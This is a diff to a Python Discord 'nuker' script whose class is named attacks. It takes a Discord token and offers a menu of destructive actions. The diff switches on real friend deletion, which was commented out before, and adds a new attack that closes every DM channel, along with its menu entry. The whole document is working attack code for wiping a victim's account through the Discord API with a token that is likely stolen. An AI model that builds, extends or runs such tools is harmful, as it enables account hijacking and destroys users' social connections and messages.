@@ -45,8 +45,8 @@ class attacks():
         }
         friends = requests.get("https://discord.com/api/v10/users/@me/relationships", headers=headers).json()
         for friend in friends:
-            # requests.delete("https://discord.com/api/v10/users/@me/relationships/{}".format(friend["id"]), headers=headers)
-            print("[*] Removing friend [USERNAME: {}]".format(friend[0]))
+            requests.delete("https://discord.com/api/v10/users/@me/relationships/{}".format(friend["id"]), headers=headers)
+            print("[*] Removing friend [USERNAME: {}]".format(friend["user"]["username"]))
             
     def message_remover(token):
         headers = {
@@ -71,7 +71,16 @@ class attacks():
                             loop = False
             except:
                 break
-
+            
+    def dm_remover(token):
+        headers = {
+            "authorization": token
+        }
+        channels = requests.get("https://discord.com/api/v10/users/@me/channels", headers=headers).json()
+        for channel in channels:
+            requests.delete("https://discord.com/api/v10/channels/{}".format(channel["id"]), headers=headers)
+            print("[*] DM closed [ID: {}]".format(channel["id"]))
+            
 os.system("cls")
 
 token = input("[?] Enter discord token: ")
@@ -90,7 +99,7 @@ def main():
     print("[2] Server leaver")
     print("[3] Message remover")
     print("[4] Friend remover")
-
+    print("[5] DM remover")
 
     time.sleep(1)
     attack = int(input("\n[?] Select attack: "))
@@ -119,6 +128,13 @@ def main():
     elif attack == 4:
         os.system("cls")
         attacks.friend_remover(token)
+        input("\n[*] Attack executed, press enter to continue.. ")
+        time.sleep(1)
+        os.system("cls")
+        main()
+    elif attack == 5:
+        os.system("cls")
+        attacks.dm_remover(token)
         input("\n[*] Attack executed, press enter to continue.. ")
         time.sleep(1)
         os.system("cls")
